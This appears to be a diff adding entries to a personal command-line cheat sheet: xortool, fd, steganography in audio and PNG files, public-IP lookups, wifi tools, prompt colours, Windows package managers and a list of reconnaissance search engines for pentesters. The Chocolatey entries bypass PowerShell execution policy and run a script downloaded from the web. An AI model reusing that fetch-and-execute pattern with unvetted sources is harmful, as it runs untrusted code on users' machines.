+-yay -Sy xortool
+-echo "Hello" | xortool-xor -r secretkey -f - > lol.txt
+[DECRYPT]
+-xortool-xor -r secretkey -f lol.txt
+[YOU CAN ALSO SET THE HEX KEY]
+-xortool-xor -h 01 -f lol.txt
+
+========================================
+
+#arch
+$pause320
+*HOW TO PAUSE AND CONTINUE ANY PROCESS
+[DEBIAN]
+-ctrl+z
+[FOR PAUSE]
+-fg %1
+[FOR CONTINUE IN FOREGROUND]
+-bg %1
+[FOR CONTINUE IN BACKGROUND]
+
+========================================
+
+#find
+$fd321
+*FIND ANY FILE WITH FD CMD
+-fd filename /
+[FIND ONLY EXTENSION]
+-fd -e jpg
+[FIND ONLY HIDDEN FILE]
+-fd -H .bashrc
+
+========================================
+
+#convert
+$dh322
+*DECIMAL TO HEX IN LINUX
+-printf "%x\n" 34
+        OR
+-echo "obase=16; 34" | bc
+
+========================================
+
+#alternative
+$exa323
+*ALTERNATE OF LS
+-exa -l --color=always --group-directories-first --icons
+
+========================================
+
+#steg
+$spect324
+*HIDE IMAGE IN AUDIO FILE
+[TYPE ANY TEXT IN IMAGE OR PASTE QR CODE IN IMAGE]
+[DEBIAN]
+-apt install enscribe
+-enscribe secret.jpg S.wav
+[ARCH]
+-sudo pacman -S perl
+-which cpan  
+-sudo ln -s /usr/bin/core_perl/cpan /usr/bin/cpan
+-sudo cpan Audio::Wav
+-sudo cpan GD
+%imagespectrogram.pl
+-./imagespectrogram.pl secret.jpg
+
+
+========================================
+
+#steg
+$sonic325
+*UNHIDE IMAGE IN AUDIO FILE
+-pacman -S sonic-visualiser
+-sonic-visualiser lol.wav
+-Go to LAYER > ADD SPECTOGRAM
+-Press > [Shift + G]
+        OR
+-audioprism lol.wav sec.jpg
+        OR
+-pip install specky
+-specky-show lol.wav
+        OR
+-sox lol.wav -n spectrogram
+        OR
+-ffmpeg -i lol.wav -lavfi showspectrumpic=s=800x400:mode=separate s.png
+
+========================================
+
+#net
+$pbip326
+*PUBLIC IP SHOW IN LINUX
+(-4 = IPv4  -6 = IPv6)
+-curl ifconfig.me
+        OR
+-curl https://ipinfo.io/json
+        OR
+-curl -4 icanhazip.com
+        OR
+-curl ipinfo.io/ip
+        OR
+-curl api.ipify.org
+        OR
+-curl checkip.dyndns.org
+        OR
+-curl ident.me
+        OR
+-curl ipecho.net/plain
+
+========================================
+
+#wifi
+$wavemon327
+*CHECK WIFI SPEED IN LINUX
+-sudo pacman -Sy wavemon
+-wavemon
+        OR
+-sudo lshw -C network
+        OR
+-watch -n 1 cat /proc/net/wireless
+
+========================================
+
+#wifi
+$nmtui328
+*CONNECT WIFI IN TERMINAL
+-nmtui-connect
+
+========================================
+
+#cli_tool
+$cht329
+*HOW TO SEE ALL INFO ABOUT ANY TOOL WITH CURL
+-curl cht.sh/pwd
+        OR
+-curl cheat.sh/ls
+
+========================================
+
+#os
+$old_prompt330
+*CHANGE LINUX PROMPT [ADVANCED LEVEL]
+-PS1='\[\033[46m\]\[\033[1;30m\]\3\[\033[1;30m\]\w\[\033[1;30m\]\[\033[1;31m\]X\[\033[46m\]\[\033[40m\]3-\[\033[1;30m\]3-\[\033[1;32m\]'
+[\[\033[1;30m\] segments correspond to: COVER, font, color codes below]
+[COVER] = if you do not put this at the start, the prompt writes over the same line instead of starting a new one
+[FONTS]
+0 = Normal
+1 = Bold
+3 = Italic
+4 = Underline
+[TEXT COLOR]
+30 = Black          36 = Cyan
+31 = Red            37 = White
+32 = Green
+33 = Yellow
+34 = Blue
+35 = Purple
+[BACKGROUND COLOR]
+\[\033[46m\] -> sets Background
+40 = Black
+41 = Red
+42 = Green
+43 = Yellow
+44 = Blue
+45 = Purple
+46 = Cyan
+47 = White
+
+========================================
+
+#windows
+$winger331
+*COMMAND PROMPT PKG MANAGER
+-winget install python
+
+========================================
+
+#windows
+$choco332
+*[CHOCOLATEY] THE WINDOWS PKG MANAGER
+[INSTALL USING POWERSHELL]
+-Set-ExecutionPolicy AllSigned
+        OR
+-Set-ExecutionPolicy Bypass -Scope Process
+(now run this cmd for installing choco)
+-Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
+        OR
+[INSTALL USING CMD SHELL]
+-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"
+-choco install chrome
+        OR
+-choco install npm
+
+========================================
+
+#steg
+$pilpng333
+*HIDE MESSAGE IN A PNG IMAGE USING PIL
+-pip install pillow
+-pip install numpy
+%hide_msg_in_png.py
+
+EXTRACT MESSAGE IN PNG 
+%extract_msg_in_png.py
+
+========================================
+
+#images
+$mix334
+*HOW TO MIX IMAGES USING GMIC
+-gmic a.png b.png -blend xor -o out.png
+(SOME MORE FEATURES OF GMIC)
+(TRY IT YOURSELF)
+-gmic f.png x_warp
+-gmic f.png v.png x_morph
+-gmic f.png xor 128
+-gmic f.png +mirror x xor
+
+========================================
+
+#windows
+$batwin335
+*HOW TO CHECK BATTERY LIFE OF LAPTOP IN WINDOWS
+(open cmd in administration)
+-powercfg /energy
+(this cmd saves a file energy-report.html, open this file and find "Design Capacity" and "Last Full Charge")
+FORMULA:
+BATTERY HEALTH = (LAST FULL CHARGE / DESIGN CAPACITY) x 100
+FOR EX:
+DESIGN CAPACITY = 35300
+LAST FULL CHARGE = 29060
+BH = 29060 / 35300 x 100 = 82%
+(if your battery health is below 80% then it's time to change your battery)
+
+========================================
+
+#arch
+$acpi336
+*HOW TO CHECK BATTERY HEALTH IN LINUX
+-acpi -V
+
+========================================
+
+#theory
+$noisli337
+*GENERATES BACKGROUND NOISE TO HELP YOU WHILE YOU STUDY AND WORK
+-www.noisli.com
+
+========================================
+
+#theory
+$radio338
+*LISTEN TO RADIO STATION ANYWHERE IN THE WORLD
+-www.radio.garden
+
+========================================
+
+#theory
+$mathway339
+*SOLVE ALGEBRA, CALCULUS, AND EVEN CHEMISTRY PROBLEMS
+-www.mathway.com
+
+========================================
+
+#theory
+$search340
+*SEARCH ENGINES FOR PENTESTERS
+-shodan.io [SERVER]
+-google.com [DORKS]
+-wigle.net [WIFI NETWORKS]
+-grep.app [CODE SEARCH]
+-app.binaryedge.io [THREAT INTELLIGENCE]
+-onyphe.io [SERVER]
+-viz.greynoise.io [THREAT INTELLIGENCE]
+-pulsedive.com [THREAT INTELLIGENCE]
+-censys.io [SERVER]
+-hunter.io [EMAIL ADDRESSES]
+-fofa.info [THREAT INTELLIGENCE]
+-zoomeye.org [THREAT INTELLIGENCE]
+-leakix.net [THREAT INTELLIGENCE]
+-intelx.io [OSINT]
+-app.netlas.io [ATTACK SURFACE]
+-searchcode.com [CODE SEARCH]
+-urlscan.io [THREAT INTELLIGENCE]
+-publicwww.com [CODE SEARCH]
+-fullhunt.io [ATTACK SURFACE]
+-socradar.io [THREAT INTELLIGENCE]
+-binaryedge.io [ATTACK SURFACE]
+-ivre.rocks [SERVER]
+-crt.sh [CERTIFICATE SEARCH]
+-vulners.com [VULNERABILITIES]
